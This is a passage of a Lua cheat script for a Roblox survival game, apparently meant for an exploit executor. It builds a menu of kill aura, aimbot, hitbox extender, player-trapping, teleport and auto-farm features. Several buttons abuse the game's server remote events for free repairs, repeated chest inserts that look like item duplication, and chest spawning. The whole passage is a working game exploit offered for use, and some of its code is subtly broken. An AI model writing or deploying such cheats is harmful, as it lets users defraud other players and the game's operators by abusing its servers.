					if string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'staff') or string.find(funnyitem.Name:lower(), 'moonstone') or string.find(funnyitem.Name:lower(), 'lunar') or string.find(funnyitem.Name:lower(), 'zenyte') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'diamond') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'lucky') or string.find(funnyitem.Name:lower(), 'pumpkin') or string.find(funnyitem.Name:lower(), 'book') or string.find(funnyitem.Name:lower(), 'volcanic ore') then
						if not funnyitem:FindFirstChildOfClass('StringValue') and not funnyitem.Parent:FindFirstChildOfClass('Humanoid') and not string.find(funnyitem.Name:lower(), 'harvest') and not string.find(funnyitem.Name:lower(), 'wizard') and not string.find(funnyitem.Name:lower(), 'zenytes') and not string.find(funnyitem.Parent.Name:lower(), 'anvil') and not string.find(funnyitem.Name:lower(), 'pet') and not string.find(funnyitem.Name:lower(), 'cave') and not string.find(funnyitem.Name:lower(), 'rock') and not string.find(funnyitem.Name:lower(), 'stone') then
							if IsPlayerAlive(LocalPlayer) then
								local dist = (LocalPlayer.Character.HumanoidRootPart.Position - funnyitem:GetPivot().Position).magnitude
								if dist < range then
									range = dist
									closest = funnyitem
								end
							end
						end
					end
				end
            end
            return closest
        end
        if FindFunnyClosestItem() then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(FindFunnyClosestItem():GetPivot().Position)
            task.wait(0.2)
            AutoPickup()
            LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
        else
            MakeAtlasNotification('wah wah wahhh', 'noting good on da floor :(', 3)
        end
    end
})

local InstantRepairSection = Main:CreateSection('Instant repair free, click as many times as needed')

InstantRepairSection:CreateDropdown({
    Name = 'Instant Repair',
    DefaultItemSelected = '...',
    Options = {'MoonstoneSet', 'ObsidianSet', 'AllShields', 'AllSwords', 'AllBows', 'AllBooks', 'AllStaffs'},
    Callback = function(Value)
        local ClosestChest = GetClosestChest()
        if not ClosestChest then
            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
            return
        end
        local set

        if Value == 'MoonstoneSet' then
            set = MoonstoneSet
        elseif Value == 'ObsidianSet' then
            set = ObsidianSet
        elseif Value == 'AllShields' then
            set = AllShields
        elseif Value == 'AllSwords' then
            set = AllSwords
        elseif Value == 'AllBows' then
            set = AllBows
        elseif Value == 'AllBooks' then
            set = AllBooks
        elseif Value == 'AllStaffs' then
            set = AllStaffs
        end
        
        for _, piece in pairs(set) do
            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, piece)
            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, piece)
        end
        MakeAtlasNotification('Repaired', 'Repaired '..Value, 1)
    end
})

local AnythingInChestSection = Main:CreateSection('Place Anything in(nearest) chest')

AnythingInChestSection:CreateDropdown({
    Name = 'Specific Chest Type',
    DefaultItemSelected = 'Any',
    Options = {'Any', 'Wood', 'Stone', 'Silver', 'Gold', 'Ruby', 'Diamond', 'Zenyte', 'Obsidian', 'Moonstone'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().configs.ChestType = Value 
    end
})

AnythingInChestSection:CreateButton({
    Name = 'Store Item',
    Callback = function()
        local function GetClosestFilteredChest()
            local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
	        local closest
	        local range = math.huge
            if IsPlayerAlive(LocalPlayer) then
                for _, chest in pairs(Workspace:WaitForChild("Replicators")[CheckPassiveOrNonPassive]:GetChildren()) do
                    if string.find(chest.Name:lower(), 'storage') and chest:FindFirstChildOfClass('MeshPart') then
                        if getgenv().configs.ChestType == 'Any' then
                            local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                            if dist < range then
                                range = dist
                                closest = chest
                            end
                        else
                            if string.find(chest.Name:lower(), getgenv().configs.ChestType:lower()) then
                                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                                if dist < range then
                                    range = dist
                                    closest = chest
                                end
                            end
                        end
                    end
                end
            end
	        return closest
        end
        local GetFilteredChest = GetClosestFilteredChest()
        if not GetFilteredChest then
            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
            return
        end
        for i=1, getgenv().AmountOfChestInserts do
            RemoteEvents['UpdateStorageChest']:FireServer(GetFilteredChest, true, SWITCHEDITEMSTABLE[getgenv().ItemToPutInChest])
        end
    end
})

getgenv().ChestItems = AnythingInChestSection:CreateDropdown({
    Name = 'Inventory Item',
    DefaultItemSelected = '...',
    Options = {'...'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().ItemToPutInChest = Value 
    end
})

local ItemsToPutInChest = {};

for _, inv in pairs(MyInventory:GetChildren()) do
    if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
        table.insert(ItemsToPutInChest, inv.Name)
    end
end

table.sort(ItemsToPutInChest)

getgenv().ChestItems:Update(ItemsToPutInChest)

if not getgenv().InventoryCollecting then
    getgenv().InventoryCollecting = MyInventory.ChildAdded:Connect(function(item)
        ItemsToPutInChest = {}
		for _, inv in pairs(MyInventory:GetChildren()) do
			if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
				table.insert(ItemsToPutInChest, inv.Name)
			end
		end
        table.sort(ItemsToPutInChest)
        getgenv().ChestItems:Update(ItemsToPutInChest)
    end)
end

AnythingInChestSection:CreateSlider({
    Name = 'Amount of item',
    Min = 1,
	Max = 200,
	Default = 1,
	Digits = 0,
	Flag = 'AmountChestItem',
	Callback = function(Value)
		getgenv().AmountOfChestInserts = Value
	end 
})

local AutoEatSection = Main:CreateSection('Auto Eat')

AutoEatSection:CreateToggle({
    Name = 'Auto Eat',
    Default = false,
	Flag = 'AutoEat',
    Callback = function(Value)
        getgenv().configs.AutoEat = Value
        AutoEat()
    end
})
AutoEatSection:CreateDropdown({
    Name = 'Auto Eat Type',
    DefaultItemSelected = 'AFK',
    Options = {'AFK', 'War'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().configs.EatingType = Value
    end
})

local MiscSection = Main:CreateSection('Misc')

MiscSection:CreateToggle({
    Name = 'Ctrl+Click tp',
    Default = false,
	Flag = 'CtrlTp',
    Callback = function(Value)
        getgenv().configs.ClickTp = Value
        ClickTp()
    end
})

MiscSection:CreateToggle({
    Name = 'Mine Aura',
    Default = false,
	Flag = 'MineAura',
        Callback = function(Value)
        getgenv().configs.MineAura = Value
        MineAura()
    end
})

MiscSection:CreateButton({
    Name = 'Resets character',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local Respawn
            local oldpos = LocalPlayer.Character.HumanoidRootPart.Position
            LocalPlayer.Character.Humanoid.Health = 0
            Respawn = LocalPlayer.CharacterAdded:Connect(function(chr)
                chr:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(oldpos)
                Respawn:Disconnect()
                return
            end)
        end
    end
})

MiscSection:CreateButton({
    Name = 'Render Map(Helpful for loading assets)',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame
            local function MakeTween(pos)
                return TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {CFrame = CFrame.new(pos)})
            end
            local a = MakeTween(Vector3.new(-1812, 46, -7685))
            a:Play()
            a.Completed:Wait()
            local b = MakeTween(Vector3.new(-1838, 46, -3189))
            b:Play()
            b.Completed:Wait()
            local c =  MakeTween(Vector3.new(5825, 76, -3258))
            c:Play()
            c.Completed:Wait()
            local d =  MakeTween(Vector3.new(5330, 36, -7372))
            d:Play()
            d.Completed:Wait()
            local e =  MakeTween(Vector3.new(4782, 74, -5208))
            e:Play()
            e.Completed:Wait()
            local f =  MakeTween(Vector3.new(-152, 106, -4079))
            f:Play()
            f.Completed:Wait()
            LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = oldpos
        end
    end
})

MiscSection:CreateToggle({
    Name = 'Other Hacker Detector',
    Default = false,
	Flag = 'HackerDetector',
    Callback = function(Value)
        local function CheckTeleport(rootpart, initialpos)
            task.wait(0.2)
            if (rootpart.Position - initialpos).magnitude > 100 then
                return true
            end
        end
        local function CheaterDetector()
            _G.cooldown = 0
            local abs = math.abs
            local Reason = 'Unknown'
            while getgenv().configs.CheaterDetector do
                if getgenv().configs.CheaterDetector then
                    task.wait(_G.cooldown)
                    for _, plr in pairs(Players:GetPlayers()) do
                        if plr ~= LocalPlayer then
                            if IsPlayerAlive(plr) then
                                local oldpos = plr.Character.HumanoidRootPart.Position
                                local velocity = plr.Character.HumanoidRootPart.AssemblyLinearVelocity
                                local maxvelocity = {abs(velocity.X), abs(velocity.Y), abs(velocity.Z)}
                                local max = math.max(unpack(maxvelocity))
                                task.spawn(function()
                                    if CheckTeleport(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.Position) then
                                        Reason = 'Teleporting'
                                        MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    end
                                    _G.cooldown = 0.5
                                end)
                                if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.PlatformStanding then
                                    Reason = 'Flying'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 3
                                elseif plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated and max > 60 then
                                    Reason = 'Vehicle Fly/Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif max > 80 and max ~= maxvelocity[2] then
                                    Reason = 'Excessive Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif plr.Character.Humanoid.WalkSpeed > 24 then
                                    Reason = 'Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif plr.Character.Humanoid.JumpPower > 80 then
                                    Reason = 'Jump Power'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                end
                            end
                        end
                    end
                end
            end
        end
        getgenv().configs.CheaterDetector = Value
        CheaterDetector()
    end
})

local BumpUpMainSection = Main:CreateSection('')

local KillAuraSection = Combat:CreateSection('Kill Aura')

KillAuraSection:CreateToggle({
    Name = 'Kill Aura',
    Default = false,
    Flag = 'KillAura',
    Callback = function(Value)
        getgenv().configs.KillAura = Value
        KillAura()
    end
})

KillAuraSection:CreateTextBox({
    Name = 'Whitelist Person',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'WhitelistPersonTextbox',
    Callback = function(args)
        if args == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                table.insert(Whitelist_table, plr.Name)
                MakeAtlasNotification("Player added to whitelist", plr.Name .. ' was added to the whitelist table', 3)
                return
            end
        end
    end
})

KillAuraSection:CreateTextBox({
    Name = 'Remove Whitelisted Person',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'BlacklistPersonTextbox',
    Callback = function(args)
        if args == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                if table.find(Whitelist_table, plr.Name) then
                    table.remove(Whitelist_table, table.find(Whitelist_table, plr.Name))
                    MakeAtlasNotification("Player removed from whitelist", plr.Name .. ' was removed from the whitelist', 3)
                    return
                end
            end
        end
    end
})

local CloseCombatSection = Combat:CreateSection('Close Combat')

CloseCombatSection:CreateToggle({
    Name = 'Player Lock(Aimbot)',
    Default = false,
    Flag = 'PlayerLock',
    Callback = function(Value)
        getgenv().configs.PlayerLock = Value
        PlayerLock()
    end
})

CloseCombatSection:CreateToggle({
    Name = 'Auto Heal(Pumpkins)',
    Default = false,
    Flag = 'AutoHeal',
    Callback = function(Value)
        getgenv().configs.Pumpkins = Value
        Pumpkins()
    end
})

CloseCombatSection:CreateToggle({
    Name = 'Hitbox Extender',
    Default = false,
    Flag = 'HitboxExtender',
    Callback = function(Value)
        getgenv().configs.Hitbox = Value
        Hitbox()
        if not getgenv().configs.Hitbox then
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
                    plr.Character.Hitbox.Size = Vector3.new(4.9453125, 6.273651123046875, 2.0283203125)
                end
            end
        end
    end
})

CloseCombatSection:CreateSliderToggle({
	Name = "EscapeDeath(Slider = Time)",
	Min = 5,
	Max = 30,
    SliderDefault = 15,
	Digits = 0,
	ToggleDefault = false,
    SliderFlag = "EscapeDeathSlider",
	ToggleFlag = "EscapeDeathToggle",
	SliderCallback = function(Value) 
		TimeBetweenTps = Value
	end,
	ToggleCallback = function(Value)  
		getgenv().configs.SafeDeath = Value
        SafeDeath()
	end
})

local AdvancedKillAuraSection = Combat:CreateSection('Advanced Kill Aura')


AdvancedKillAuraSection:CreateTextBox({
    Name = 'Op KillAura Target',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'OpKillAuraTarget',
    Callback = function(Value)
        if Value == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
                table.insert(OpKillAuraTable, 1, plr)
                MakeAtlasNotification("Entered "..plr.Name, 'You are going to target ' ..plr.Name .. ' >:)', 3)
                return
            end
        end
    end
})
AdvancedKillAuraSection:CreateSliderToggle({
	Name = "Op Kill Aura(Dont touch slider)",
	Min = 1,
	Max = 8,
    SliderDefault = 3,
	Digits = 0,
	ToggleDefault = false,
    SliderFlag = "PredictionDistance",
	ToggleFlag = "OPKillAura",
	SliderCallback = function(Value) 
		getgenv().PredictAmount = Value
	end,
	ToggleCallback = function(Value)  
		getgenv().configs.OpKillAura = Value
        OpKillAura()
	end
})

AdvancedKillAuraSection:CreateToggle({
    Name = 'Toggle Predict',
    Default = false,
    Flag = 'TogglePredict',
    Callback = function(Value)
        getgenv().configs.PredictOpKillAura = Value
    end
})

local CombatMiscsSection = Combat:CreateSection('Miscs')

CombatMiscsSection:CreateToggle({
    Name = 'Mob Aura',
    Default = false,
    Flag = 'MobAura',
    Callback = function(Value)
        getgenv().configs.MobAura = Value
        MobAura()
    end
})

CombatMiscsSection:CreateKeybind({
    Name = 'Trap Player',
    Default = 'Minus',
    Flag = 'TrapPlayer',
    KeyPressed = TrapPlayer
})

CombatMiscsSection:CreateDropdown({
    Name = 'Trap Type',
    DefaultItemSelected = 'Stone Trap',
    Options = {'Stone Trap', 'Ruby Trap', 'Zenyte Trap'},
    ItemSelecting = true,
    Callback = function(Value)
       getgenv().configs.TrapType = Value 
    end
})

local TreeFarmSection = Farming:CreateSection('Tree Farm')

TreeFarmSection:CreateToggle({
	Name = 'Conifer Farm(equip any tool)',
	Default = false,
    Flag = 'ConiferFarm',
	Callback = function(Value)
		getgenv().configs.ConfierFarm = Value
		ConiferFarm()
	end
})

local BossFarmSettingSection = Farming:CreateSection('Boss Farm Settings')

BossFarmSettingSection:CreateToggle({
    Name = 'Auto repair Ob Club(50%)(place chest)',
    Default = false,
    Flag = 'AutoRepairClub',
    Callback = function(Value)
        getgenv().configs.AutoRepairClub = Value
       AutoRepairClub()
    end
})

BossFarmSettingSection:CreateToggle({
    Name = 'Use Soul Keys to farm bosses(inf farm)',
    Default = false,
    Flag = 'SoulKeyBossFarm',
    Callback = function(Value)
        getgenv().configs.UseSoulKeys = Value
    end
})

local BossFarmsSection = Farming:CreateSection('Boss Farms(Disables kill aura)')

BossFarmsSection:CreateToggle({
    Name = 'Obsidian Boss Farm',
    Default = false,
    Flag = 'ObsidianBossFarm',
    Callback = function(Value)
        getgenv().configs.ObsidianBoss = Value
       ObsidianBoss()
    end
})

BossFarmsSection:CreateToggle({
    Name = 'Zenyte/Lucky Boss Farm',
    Default = false,
    Flag = 'Zenyte/LuckyBoss Farm',
    Callback = function(Value)
        getgenv().configs.ZenLuckBoss = Value
       ZenLuckBoss()
    end
})

BossFarmsSection:CreateToggle({
    Name = 'Spirit Boss Aura',
    Default = false,
    Flag = 'SpiritBossFarm',
    Callback = function(Value)
        getgenv().configs.SpiritBoss = Value
       SpiritBoss()
    end
})

local NotAutoSection = Farming:CreateSection('NOT AUTO')

NotAutoSection:CreateToggle({
    Name = 'Lucky Slime Farm',
    Default = false,
    Flag = 'LuckySlimeFarm',
    Callback = function(Value)
        getgenv().configs.LuckySlime = Value
       LuckySlime()
    end
})

NotAutoSection:CreateToggle({
    Name = 'Evil Skeleton Farm',
    Default = false,
    Flag = 'EvilSkeletonFarm',
    Callback = function(Value)
        getgenv().configs.EvilSkeleton = Value
        EvilSkeleton()
    end
})

NotAutoSection:CreateToggle({
    Name = 'Ogre Farm',
    Default = false,
    Flag = 'OgreFarm',
    Callback = function(Value)
        getgenv().configs.Ogre = Value
       Ogre()
    end
})

NotAutoSection:CreateToggle({
    Name = 'Captain Squid Farm',
    Default = false,
    Flag = 'CaptainSquidFarm',
    Callback = function(Value)
        getgenv().configs.Squid = Value
        Squid()
    end
})

local BumpUpFarmSection = Farming:CreateSection('')

local EventsSection = Teleports:CreateSection('Events')

EventsSection:CreateButton({
    Name = 'Asteroid',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            if Workspace:FindFirstChild('Asteroid', true) then
                local AstPos = Workspace:FindFirstChild('Asteroid', true):GetPivot().Position
                local myroot = LocalPlayer.Character.HumanoidRootPart
                myroot.CFrame = CFrame.new(AstPos + Vector3.new(0, 35, 0))
            else
                MakeAtlasNotification('No Asteroids gangy', 'A sad sad day... I know :(', 3)
            end
        end
    end
})

EventsSection:CreateButton({
    Name = 'Lucky Slime',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            if Workspace:WaitForChild('Replicators'):FindFirstChild('Both'):FindFirstChild("Lucky Slime") then
                local slime = Workspace.Replicators.Both["Lucky Slime"]
                if slime:FindFirstChild('Humanoid') and slime:FindFirstChild('HumanoidRootPart') then
                    local slimepos = slime.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    myroot.CFrame = CFrame.new(slimpos + Vector3.new(15, 0, 0))
                end
            else
                MakeAtlasNotification('No Lucky Slime gangy', 'A sad sad day... I know :(', 3)
            end
        end
    end
})

EventsSection:CreateButton({
    Name = 'Mega Candy Rock',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1944.84009, -6.88914394, -3933.60352, -0.775113165, 2.15758467e-10, 0.631822467, 5.72924108e-09, 1, 6.68708688e-09, -0.631822467, 8.80311202e-09, -0.775113165)
        end
    end
})

local TradersSection = Teleports:CreateSection('Traders')

TradersSection:CreateButton({
    Name = 'Resource Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(4288, 43, -4014)
        end
    end
})

TradersSection:CreateButton({
    Name = 'Armor/Weapon Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(427, 12, -3451)
        end
    end
})

TradersSection:CreateButton({
    Name = 'Ocean Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1673, -290, -5659)
        end
    end
})

local VolcanoSection = Teleports:CreateSection('Volcano')

VolcanoSection:CreateButton({
    Name = 'Volcano',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(-842, 63, -3603)
        end
    end
})

VolcanoSection:CreateButton({
    Name = 'Volanic Furnace',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(2614, -454, -5579)
        end
    end
})

local CavesSection = Teleports:CreateSection('Caves')

CavesSection:CreateButton({
    Name = 'Zenyte Boss',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1741, -440, -4536)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Spirit Boss',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1427, -293, -4959)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Caves level 3',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1581, -502, -4649)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Caves level 2',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1559, -347, -4635)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Central Caves',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1532, -192, -4696)
        end
    end
})

local IslandSection = Teleports:CreateSection('Islands')

IslandSection:CreateButton({
    Name = 'Ice Biome',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1961, -2, -3973)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Pet Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(2889, 54, -6465)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Banaenae Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(3400, 13, -4467)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Magic Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1292, 125, -7234)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Starter Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(-7507, 19, 7496)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Secret Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(7139, 72, 18673)
        end
    end
})

local LeaderboardSection = Teleports:CreateSection('Leaderboard')

LeaderboardSection:CreateButton({
    Name = 'Leaderboard Place',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(5313, 4, -5508)
        end
    end
})

local BumpUpTeleportSection = Teleports:CreateSection('')

local ChestSpawningSection = Chests:CreateSection('Chest Spawning')

ChestSpawningSection:CreateButton({
    Name = 'Spawn Easy Treaure Chest(100 tokens)',
    Callback = function()
        RemoteEvents['BuyWorldEvent']:FireServer(1)
    end
})

ChestSpawningSection:CreateButton({
    Name = 'Spawn Medium Treaure Chest(450 tokens)',
    Callback = function()
        RemoteEvents['PetShop']:FireServer(200)
    end
})

ChestSpawningSection:CreateButton({
    Name = 'Spawn Hard Treaure Chest(1000 tokens)',
    Callback = function()
        RemoteEvents['BuyWorldEvent']:FireServer(3)
    end
})

local ChestOpeningSection = Chests:CreateSection('Chest Opening')

ChestOpeningSection:CreateButton({
    Name = 'Open Easy Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(166, "Open")
    end
})

ChestOpeningSection:CreateButton({
    Name = 'Open Medium Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(167, "Open")
    end
})

ChestOpeningSection:CreateButton({
    Name = 'Open Hard Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(168, "Open")
    end
})

local ChestFindingSection = Chests:CreateSection('Chest Finding')

ChestFindingSection:CreateButton({
    Name = 'Get Map Treaure',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            local myroot = LocalPlayer.Character.HumanoidRootPart
            local function GetAllTreasure()
                for _, chest in pairs(Workspace:GetDescendants()) do
                    if string.find(chest.Name, 'Treasure Chest') then
                        local chestpos = chest:GetPivot().Position
                        repeat task.wait()
                            if chest.Parent then
                                myroot.CFrame = CFrame.new(chestpos + Vector3.new(0, 1, 0))
                                RemoteEvents['ItemInteracted']:FireServer(chest, "Pickup")
                            end
                        until not chest.Parent
                    end
                end
                myroot.CFrame = oldpos
            end
            if not GetAllTreasure() then
                MakeAtlasNotification('No chests spawned in :(', 'Try spawning one in! or..... wait.', 3)
            end
        end
    end
})

local ClueHelperSection = Chests:CreateSection('Clue Helper')

ClueHelperSection:CreateButton({
    Name = 'Clue is a text',
    Callback = function()
        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
        local currentclue = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Riddle')
        local loadout = currentclue.Parent.Loadout.Text
        local cluetable = {};
        local CLUETYPE = nil;
        local loadoutsubbed = string.gsub(loadout, 'Must wear:  ', '')

        local function TrackClue()
            for _, riddle in pairs(Steps) do
                if riddle.Riddle ~= nil then
                    if currentclue.Text == riddle.Riddle then
                        CLUETYPE = riddle.Name
                    end
                end
            end
            if CLUETYPE ~= nil then
                for _, clue in pairs(Workspace:GetDescendants()) do
                    if clue.Name == CLUETYPE then
                        if clue:IsA('Model') then
                            if clue.PrimaryPart ~= nil then
                                table.insert(cluetable, clue.PrimaryPart.Position)
                            end
                        else
                            table.insert(cluetable, clue.Position)
                        end
                    end
                end
            end
            if cluetable[1] ~= nil then
                if IsPlayerAlive(LocalPlayer) then
                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(cluetable[1] + Vector3.new(0, 20, 0))
                    return true
                end
            else
                MakeAtlasNotification("Clue not found", 'Your clue is not on the map', 3)
                return false
            end
        end
        if TrackClueImage() then
            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
        end
    end
})

ClueHelperSection:CreateButton({
    Name = 'Clue is an image',
    Callback = function()
        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
        local CurrentClueImage = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('ImageLabel').Image
        local loadout = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Loadout').Text
        local IMAGES = {};
        local CLUELOCATION = nil;
        local loadoutsubbed = string.gsub(loadout, 'Must wear: ', '')
        
        function TrackClueImage()
            local function CheckImage()
                for _, image in pairs(Steps) do
                    if image.Image then
                        if CurrentClueImage == image.Image then
                            CLUELOCATION = image.Location
                            return true
                        end
                    end
                end
                return false
            end
            
            if CheckImage() then
                if IsPlayerAlive(LocalPlayer) then
                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(CLUELOCATION + Vector3.new(0, 15, 0))
                    if not LocalPlayer.Character:FindFirstChild('Shovel') then
                        RemoteEvents['InventoryInteraction']:FireServer(169, 'Equip')
                    end
                    task.wait(0.4)
                    RemoteEvents['ToolAction']:FireServer(CLUELOCATION)
                    return true
                end
            else
                return false
            end
        end
        if TrackClueImage() then
            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
        end
    end
})

local BumpUpChestSection = Chests:CreateSection('')

local PlayerModificationsSection = LPlayer:CreateSection('Player Modifications')

PlayerModificationsSection:CreateToggle({
    Name = 'Inf-Jump',
    Default = false,
    Flag = 'InfJump',
    Callback = function(Value)
        getgenv().configs.InfJump = Value
        InfJump()
	end
})

PlayerModificationsSection:CreateToggle({
    Name = 'Anti-Ragdoll',
    Default = false,
    Flag = 'AntiRagDoll',
    Callback = function(Value)
        getgenv().configs.AntiRagDoll = Value
        if getgenv().configs.AntiRagDoll then
            if not getgenv().RagDollBypass then
                getgenv().RagDollBypass = LocalPlayer.Character:WaitForChild('Humanoid').StateChanged:Connect(function(state)
                    if not getgenv().configs.AntiRagDoll then
                        getgenv().RagDollBypass:Disconnect()
                        getgenv().RagDollBypass = nil
                        return
                    end
                    if IsPlayerAlive(LocalPlayer) then
                        if LocalPlayer.Character:WaitForChild('Humanoid'):GetState() == Enum.HumanoidStateType.Physics then
                            LocalPlayer.Character.Humanoid:ChangeState(2)
                        end
                    end
                end)
            end
        else
            if getgenv().RagDollBypass then
                getgenv().RagDollBypass:Disconnect()
